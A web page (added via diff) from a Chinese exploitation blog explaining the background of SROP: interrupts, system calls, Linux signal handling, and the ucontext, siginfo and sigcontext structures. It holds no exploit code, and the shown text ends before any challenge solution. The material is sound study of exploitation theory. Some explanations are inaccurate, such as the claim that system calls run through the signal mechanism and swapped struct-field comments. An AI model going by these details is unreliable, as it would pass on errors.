@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SignalFrame分析————深入理解SROP和系统调用 SROP 也即Sigreturn Oriented Programming，是一种基于signal机制进行攻击的高级ROP利用手段，通过覆盖 Signal Frame上的关键数据来控制 sigreturn，从而达到漏洞利用的效果 我在学习SROP的过程中，发现了一道设计巧妙的题目，我在分析了其他师傅的WP后，又去了解了一下SROP背后的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SignalFrame分析">
+<meta property="og:url" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="SignalFrame分析————深入理解SROP和系统调用 SROP 也即Sigreturn Oriented Programming，是一种基于signal机制进行攻击的高级ROP利用手段，通过覆盖 Signal Frame上的关键数据来控制 sigreturn，从而达到漏洞利用的效果 我在学习SROP的过程中，发现了一道设计巧妙的题目，我在分析了其他师傅的WP后，又去了解了一下SROP背后的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640582446513.png">
+<meta property="og:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640703030598.png">
+<meta property="og:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640706807303.png">
+<meta property="og:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640707274321.png">
+<meta property="og:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529781412.png">
+<meta property="og:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640529918052.png">
+<meta property="article:published_time" content="2021-12-28T17:36:08.000Z">
+<meta property="article:modified_time" content="2022-01-10T10:05:18.672Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="stack">
+<meta property="article:tag" content="SROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640582446513.png">
+
+<link rel="canonical" href="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SignalFrame分析 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SignalFrame分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-12-29 01:36:08" itemprop="dateCreated datePublished" datetime="2021-12-29T01:36:08+08:00">2021-12-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-01-10 18:05:18" itemprop="dateModified" datetime="2022-01-10T18:05:18+08:00">2022-01-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="SignalFrame分析"><a href="#SignalFrame分析" class="headerlink" title="SignalFrame分析"></a>SignalFrame分析</h2><p><strong>————深入理解SROP和系统调用</strong></p>
+<p><strong>SROP</strong> 也即Sigreturn Oriented Programming，是一种基于<strong>signal机制</strong>进行攻击的高级ROP利用手段，通过覆盖 <strong>Signal Frame</strong>上的关键数据来控制 <strong>sigreturn</strong>，从而达到漏洞利用的效果</p>
+<p>我在学习<strong>SROP</strong>的过程中，发现了一道设计巧妙的题目，我在分析了其他师傅的WP后，又去了解了一下<strong>SROP</strong>背后的原理，于是想记录一下，做个总结</p>
+<hr>
+<h2 id="前言-中断流程-amp-分类"><a href="#前言-中断流程-amp-分类" class="headerlink" title="前言-中断流程&amp;分类"></a>前言-中断流程&amp;分类</h2><p>中断是计算机程序中的一种机制，用于处理一些需要及时处理的情况</p>
+<p>一，中断流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">中断请求 &gt;&gt; CPU识别 &gt;&gt; 中断判优 &gt;&gt; 保存信息 &gt;&gt; 跳转中断处理程序 &gt;&gt; 返回复原</span><br></pre></td></tr></table></figure>
+<p>1.中断请求：程序可以利用指令进行中断请求，而一些被检测出来的错误也可以触发中断请求</p>
+<p>2.CPU识别：CPU是处理中断信息的核心，它负责检测中断请求</p>
+<p>3.中断判优：当程序内部出现错误时，必须马上做出响应，所以CPU会检查flag寄存器中的“TP位”和“IF位”来获取中断的信息，以便判断哪些响应是紧急的，哪些又是可以不响应的</p>
+<p>4.保存信息：在进行响应前，内核会帮用户进程将其上下文保存在该进程的栈中</p>
+<p>5.跳转中断处理程序：根据中断信息和中断向量表找到对应的中断处理程序</p>
+<p>6.返回复原：调用函数<strong>Sigreturn</strong>来复原栈空间</p>
+<p>二，中断分类：</p>
+<p>中断可以根据其中断源和重要程度进行分类，大致有以下3种：</p>
+<p>1.内中断和外中断 </p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">外中断：是指来自处理器和内存以外的部件引起的中断，包括<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>设备发出的<span class="built_in">I</span><span class="operator">/</span><span class="built_in">O</span>中断，外部信号中断，以及各种计时器引起的时钟中断等（外中断在狭义上一般被称为中断）</span><br><span class="line"></span><br><span class="line">内中断：主要指在处理器和内存内部产生的中断，包括程序运算引起的各种错误，如地址非法、检验错、页面失效、存储访问控制错、算术操作溢出、数据格式非法、除数为<span class="number">0</span>、非法指令、用户程序执行特权指令、分时操作系统中的时间片中断以及用户态到核心态的切换等</span><br></pre></td></tr></table></figure>
+<p>2.硬件中断和软件中断 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">硬件中断：通过外部的硬件产生的中断（硬件中断属于外中断）</span><br><span class="line"></span><br><span class="line">软件中断：通过某条指令产生的中断，这种中断可以编程实现（软件中断属于内中断）</span><br></pre></td></tr></table></figure>
+<p>3.非屏蔽中断和可屏蔽中断（全是外中断） </p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">非屏蔽中断：非屏蔽中断是一种硬件中断，此种中断通过不可屏蔽中断请求NMI控制，不受中断标志位<span class="keyword">IF</span>的影响，即使关中断（<span class="attribute">IF</span>=0）的情况下也会被响应</span><br><span class="line"></span><br><span class="line">可屏蔽中断：可屏蔽中断也是一种硬件中断，此种中断通过中断请求标记触发器INTR控制，且受中断标志位<span class="keyword">IF</span>的影响，在关中断情况下不接受中断请求</span><br></pre></td></tr></table></figure>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fengfeng0328/article/details/83318000（更详细）">https://blog.csdn.net/fengfeng0328/article/details/83318000（更详细）</a></p>
+<hr>
+<h2 id="前言-系统调用"><a href="#前言-系统调用" class="headerlink" title="前言-系统调用"></a>前言-系统调用</h2><p><strong>什么是系统调用？</strong></p>
+<p>由操作系统提供的供所有系统调用的<strong>程序接口集合</strong></p>
+<p>用户程序通常只在 <strong>用户态</strong> 下运行，当用户程序想要调用只能在 <strong>内核态</strong> 运行的子程序时，所以操作系统需要提供 <strong>访问这些内核态</strong> 运行的程序的接口，这些接口的集合就叫做系统调用，简要的说，系统调用是内核向用户进程提供服务的唯一方法<br>用户程序通过系统调用从用户态（user mode）切换到核心态（ kernel mode ），从而可以访问相应的资源。这样做的好处是：</p>
+<ul>
+<li>为用户空间提供了一种硬件的抽象接口，使编程更加容易</li>
+<li>有利于系统安全</li>
+<li>有利于每个进程度运行在虚拟系统中，接口统一有利于移植</li>
+</ul>
+<p><strong>系统调用的过程</strong></p>
+<p>系统调用通过<strong>signal机制</strong>来实现</p>
+<p>一般64位系统会用 <strong>syscall</strong>（陷阱）来传递中断信息，而32位系统则会使用 <strong>int n</strong>（中断）</p>
+<p>它们都会把系统调用号装入“rax/eax”寄存器，然后把必要的参数装入其他寄存器</p>
+<p><strong>系统调用和内核的联系</strong></p>
+<p>通常，处理器设有两种模式： <strong>“用户模式”</strong> 与 <strong>“内核模式”</strong> ，通过一个标签位来鉴别当前正处于什么模式</p>
+<p>内核模式可以运行所有指令，包括特权指令（主要是一些硬件管理的指令，例如修改基址寄存器内容的指令），而用户模式不能执行特权指令，这样的设计主要为了安全问题，即由操作系统负责管理硬件，避免上层应用因错误设计而导致硬件问题 </p>
+<p>而在上文中提及到：有些基于读写的操作必须要在 <strong>“内核模式”</strong> 中完成，而系统调用为了实现这些功能而诞生的，它通过提供 <strong>有权限限制</strong> 的  <strong>“内核模式”</strong> ，来实现一些 <strong>“用户模式”</strong> 无法办到的操作</p>
+<p><strong>系统调用和库函数的联系</strong></p>
+<p>事实上，系统调用所提供给用户的是直接而纯碎的高级服务，如果想要更加人性化，具有更符合特定情况的功能，那么就要我们用户自己定义，因此衍生了库函数 </p>
+<p>库函数把系统调用进行<strong>包装</strong>，使它更方便使用，比如C语言标准库中的“printf”就使用了大量的系统调用，才实现了输出字符串到屏幕的功能</p>
+<p>所以系统调用是为了方便使用操作系统的接口，而库函数则是为了人们编程的方便 </p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DurKui/p/15345050.html">https://www.cnblogs.com/DurKui/p/15345050.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8e89b13fac7d">https://www.jianshu.com/p/8e89b13fac7d</a></p>
+<hr>
+<h2 id="简析Signal机制"><a href="#简析Signal机制" class="headerlink" title="简析Signal机制"></a>简析Signal机制</h2><p>signal机制是类unix系统中进程之间相互传递信息的一种方法，是软件中断的一种</p>
+<p>流程如下： </p>
+<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640582446513.png" class width="1640582446513"> 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某个进程发送signal机制 &gt;&gt; 保存上下文 &gt;&gt; signal处理 &gt;&gt; 还原上下文 &gt;&gt; 进行程序</span><br></pre></td></tr></table></figure>
+<p>详细来说：</p>
+<p>进程发起signal后，先会保存上下文并在<strong>栈顶</strong>添加一个 sigreturn ，然后控制IP指针指向 Siganl Handler，程序执行完成后又会还原上下文，最后控制IP指针返回</p>
+<p>​        //这样大规模的读写操作需要更高的权限，所以需要进入<strong>内核态</strong>，由于恢复的任务比较艰巨，系统干脆提供了一个系统调用 <strong>sigreturn</strong></p>
+<p><strong>Signal机制</strong>之中有几个重要的概念：</p>
+<p>1.sigreturn：一种系统调用，用于还原各个寄存器中的数据</p>
+<p>2.ucontext：linux中设计的一种结构体，给用户让渡了一部分控制代码上下文的能力</p>
+<p>3.siginfo：一种结构体，用于存储信号的信息</p>
+<p>4.Signal Frame：我们称ucontext以及siginfo这一段为Signal Frame </p>
+<p><strong>SROP</strong>的核心就是伪造Signal Frame，欺骗程序执行我们需要的代码</p>
+<hr>
+<h2 id="简析ucontext-amp-siginfo"><a href="#简析ucontext-amp-siginfo" class="headerlink" title="简析ucontext &amp; siginfo"></a>简析ucontext &amp; siginfo</h2><p><strong>ucontext：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> &#123;</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">ucontext</span> *<span class="title">uc_link</span>;</span><span class="comment">//指向此上下文返回时，将恢复的上下文的指针   </span></span><br><span class="line">               <span class="keyword">sigset_t</span>         uc_sigmask;<span class="comment">//运行时各个寄存器的值</span></span><br><span class="line">               <span class="keyword">stack_t</span>          uc_stack;<span class="comment">//运行栈</span></span><br><span class="line">               <span class="keyword">mcontext_t</span>       uc_mcontext;<span class="comment">//信号</span></span><br><span class="line">               ...	</span><br><span class="line">           &#125; <span class="keyword">ucontext_t</span>;</span><br></pre></td></tr></table></figure>
+<p>结构体ucontext用于保存上下文信息</p>
+<p>有了它，许多上下文切换的操作都可以完成，linux也为它提供了一组api：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">getcontext</span><span class="params">(<span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//获取当前上下文</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">setcontext</span><span class="params">(<span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//则是从‘ucp’指向的实例恢复上下文到现场</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makecontext</span><span class="params">(<span class="keyword">ucontext_t</span> *ucp, (<span class="keyword">void</span> *func)(), <span class="keyword">int</span>, ...)</span></span>;</span><br><span class="line"><span class="comment">//可以修改getcontext得到的上下文</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">swapcontext</span><span class="params">(<span class="keyword">ucontext_t</span> *oucp, <span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>;</span><br><span class="line"><span class="comment">//调用getcontext到oucp，然后用ucp去setcontext</span></span><br></pre></td></tr></table></figure>
+<p>这里就不继续展开了</p>
+<p><strong>siginfo：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> si_signo;<span class="comment">// signal number的简写，该变量用来存储信号编号并且恒有值</span></span><br><span class="line">    <span class="keyword">int</span> si_code;<span class="comment">// signal code的简写，可以获取多种变量值</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">sigval</span> <span class="title">si_value</span>;</span><span class="comment">// ignal value的简写，这个变量是一个结构体</span></span><br><span class="line">    <span class="keyword">int</span> si_errno;<span class="comment">// 如果该位不为0，则和信号在一起的有一个错误代码（信号发生错误）</span></span><br><span class="line">    <span class="keyword">pid_t</span> si_pid;<span class="comment">//	发送该信号的进程id</span></span><br><span class="line">    <span class="keyword">uid_t</span> si_uid;<span class="comment">// 发送该信号的用户id</span></span><br><span class="line">    <span class="keyword">void</span> *si_addr;<span class="comment">// 错误发生的地址</span></span><br><span class="line">    <span class="keyword">int</span> si_status;</span><br><span class="line">    <span class="keyword">int</span> si_band;</span><br><span class="line">&#125; <span class="keyword">siginfo_t</span>;</span><br></pre></td></tr></table></figure>
+<p>结构体siginfo用于保存signal的各种信息</p>
+<p>参考 </p>
+<p>ucontext：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a96b31da3ab0">https://www.jianshu.com/p/a96b31da3ab0</a></p>
+<p>siginfo：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zw1009-1803/p/13701754.html">https://www.cnblogs.com/zw1009-1803/p/13701754.html</a></p>
+<p>TCP简析：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41877474/article/details/102580825">https://blog.csdn.net/qq_41877474/article/details/102580825</a></p>
+<hr>
+<h2 id="简析Signal-Frame"><a href="#简析Signal-Frame" class="headerlink" title="简析Signal Frame"></a>简析Signal Frame</h2><p>Signal Frame是由ucontext和siginfo组成的区域，signal中的信息都会存储在这里</p>
+<img src="/2021/12/29/SignalFrame%E5%88%86%E6%9E%90/1640703030598.png" class width="1640703030598"> 
+<p>其末尾就是<strong>sigreturn</strong>，可以根据Signal Frame在返回原栈帧和原寄存器数据</p>
+<p>Signal Frame的结构在32位系统和64位系统中有些许不同：</p>
+<p><strong>x86</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;	</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>x64</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>每一次在请求signal后，signal handler执行前，程序<strong>都会</strong>在栈上构建这个栈帧</p>
